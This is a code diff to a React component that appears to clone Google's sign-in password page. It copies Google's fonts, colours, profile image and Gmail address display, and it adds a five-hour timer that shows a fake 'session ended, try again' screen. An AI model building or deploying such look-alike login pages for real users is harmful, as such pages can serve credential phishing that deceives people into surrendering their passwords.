@@ -34,6 +34,14 @@ export default function SigninSecondPage({
   closeSecondPage,
   userPassword,
 }) {
+  const [cookie, setCookie] = React.useState(false);
+
+  React.useEffect(() => {
+    setTimeout(() => {
+      setCookie(true);
+    }, 18000000);
+  }, []);
+
   return (
     <>
       <Container>
@@ -92,50 +100,109 @@ export default function SigninSecondPage({
                   </svg>
                 </HeroImageContent>
               </HeroImage>
-              <ViewContainer>
-                <ViewContainerContent>
-                  <ViewContainerPresentation role="presentation">
-                    <div>
-                      <ViewContainerPresentation__Header>
-                        <h1>
-                          <span>Hi {name}</span>
-                        </h1>
-                        <div style={{ height: "32px", marginTop: "8px" }}>
-                          <User__Container onClick={closeSecondPage}>
-                            <UserContainer__ImageContainer>
-                              <UserContainer__ImageContent>
-                                <UserContainer__Image src="https://lh3.googleusercontent.com/-CfjDY52G0gE/AAAAAAAAAAI/AAAAAAAAAAA/AMZuuclr8_aOMTBXFpXtw7u09oVyuMlL1w/s128-c/photo.jpg"></UserContainer__Image>
-                              </UserContainer__ImageContent>
-                            </UserContainer__ImageContainer>
-                            <ProfileIdentifier>{gmail}</ProfileIdentifier>
-                            <Container__rowDown>
-                              <svg
-                                aria-hidden="true"
-                                fill="currentColor"
-                                focusable="false"
-                                viewBox="0 0 24 24"
-                                xmlns="https://www.w3.org/2000/svg"
-                              >
-                                <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
-                              </svg>
-                            </Container__rowDown>
-                          </User__Container>
-                        </div>
-                      </ViewContainerPresentation__Header>
-                    </div>
-                    <FormContainer role="presentation">
-                      <FormContent role="presentation">
-                        <div>
-                          <div>
-                            <SigninSecondForm userPassword={userPassword} />
-                            {/* Enter your password */}
+              {cookie ? (
+                <ViewContainer>
+                  <ViewContainerContent>
+                    <ViewContainerPresentation role="presentation">
+                      <div>
+                        <ViewContainerPresentation__Header>
+                          <h1>
+                            <span>You're not signed in</span>
+                          </h1>
+                          <div
+                            style={{
+                              color: "#202124",
+                              fontSize: "16px",
+                              lineHeight: "1.5",
+                              letterSpacing: ".1px",
+                              fontWeight: "400",
+                              paddingBottom: "0",
+                              paddingTop: "8px",
+                            }}
+                          >
+                            <span>
+                              Your session ended because there was no activity.
+                              Try signing in again.
+                            </span>
                           </div>
-                        </div>
-                      </FormContent>
-                    </FormContainer>
-                  </ViewContainerPresentation>
-                </ViewContainerContent>
-              </ViewContainer>
+                          <button
+                            style={{
+                              position: "absolute",
+                              top: "50%",
+                              right: "42px",
+                              height: "48px",
+                              transform: "translateY(-50%)",
+                              color: "#fff",
+                              backgroundColor: "#1a73e8",
+                              border: "none",
+                              fontFamily: "Google Sans",
+                              padding: "0 24px 0 24px",
+                              fontSize: ".875rem",
+                              letterSpacing: ".0107142857em",
+                              textTransform: "none",
+                              fontWeight: "500",
+                              transition:
+                                "border 280ms cubic-bezier(0.4,0,0.2,1),box-shadow 280ms cubic-bezier(0.4,0,0.2,1)",
+                              boxShadow: "none",
+                              height: "36px",
+                              borderRadius: "4px",
+                              cursor: "pointer",
+                            }}
+                            className="btn__tryagain"
+                            onClick={closeSecondPage}
+                          >
+                            Try again
+                          </button>
+                        </ViewContainerPresentation__Header>
+                      </div>
+                    </ViewContainerPresentation>
+                  </ViewContainerContent>
+                </ViewContainer>
+              ) : (
+                <ViewContainer>
+                  <ViewContainerContent>
+                    <ViewContainerPresentation role="presentation">
+                      <div>
+                        <ViewContainerPresentation__Header>
+                          <h1>
+                            <span>Hi {name}</span>
+                          </h1>
+                          <div style={{ height: "32px", marginTop: "8px" }}>
+                            <User__Container onClick={closeSecondPage}>
+                              <UserContainer__ImageContainer>
+                                <UserContainer__ImageContent>
+                                  <UserContainer__Image src="https://lh3.googleusercontent.com/-CfjDY52G0gE/AAAAAAAAAAI/AAAAAAAAAAA/AMZuuclr8_aOMTBXFpXtw7u09oVyuMlL1w/s128-c/photo.jpg"></UserContainer__Image>
+                                </UserContainer__ImageContent>
+                              </UserContainer__ImageContainer>
+                              <ProfileIdentifier>{gmail}</ProfileIdentifier>
+                              <Container__rowDown>
+                                <svg
+                                  aria-hidden="true"
+                                  fill="currentColor"
+                                  focusable="false"
+                                  viewBox="0 0 24 24"
+                                  xmlns="https://www.w3.org/2000/svg"
+                                >
+                                  <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
+                                </svg>
+                              </Container__rowDown>
+                            </User__Container>
+                          </div>
+                        </ViewContainerPresentation__Header>
+                      </div>
+                      <FormContainer role="presentation">
+                        <FormContent role="presentation">
+                          <div>
+                            <div>
+                              <SigninSecondForm userPassword={userPassword} />
+                            </div>
+                          </div>
+                        </FormContent>
+                      </FormContainer>
+                    </ViewContainerPresentation>
+                  </ViewContainerContent>
+                </ViewContainer>
+              )}
             </HeroContent>
           </Hero>
           <FooterContainer__footer>
